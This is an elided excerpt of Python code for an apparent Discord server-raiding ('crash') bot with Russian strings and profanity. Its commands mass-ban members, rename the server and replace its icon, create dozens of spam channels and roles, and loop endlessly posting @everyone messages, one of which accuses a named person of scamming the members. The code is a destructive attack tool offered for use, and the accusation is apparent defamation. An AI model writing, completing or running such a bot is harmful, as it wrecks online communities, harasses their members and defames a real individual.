...
async def banall(ctx):
    print(f"{Fore.WHITE}> {Fore.RED}В бан, железки!{Fore.WHITE}...")
    ban = 0
    bany = 0
    wta = 0
...
async def chistch(ctx):
    await ctx.send("ПЕЙТЕ ПИВО С БЕНДЕРОМ БЛЯТЬ! @everyone ")
    with open('image.png', 'rb') as f:
       icon = f.read()
    await ctx.guild.edit(name="BenderChatCrash", icon=icon)
...
async def spamch(ctx):
    ...
    for b in range(50):
        try:
                await ctx.guild.create_text_channel("BENDER CRASH", reason='Админ ебанутый')
...
async def spamrl(ctx):   
    ...
    for a in range(50):
        try:
                await ctx.guild.create_role(name="BENDER CRASH", reason='Админ ебанутый')
...
async def spamth(ctx):
    while True:
      try:
        for channel in ctx.guild.text_channels:
          await channel.send("ДМИТРИЙ ИГНАТЕНКОВ ЗАСКАМИЛ ВАС!BENDER CHAT TEAM COMMUINITY @everyone")
      except:
        continue
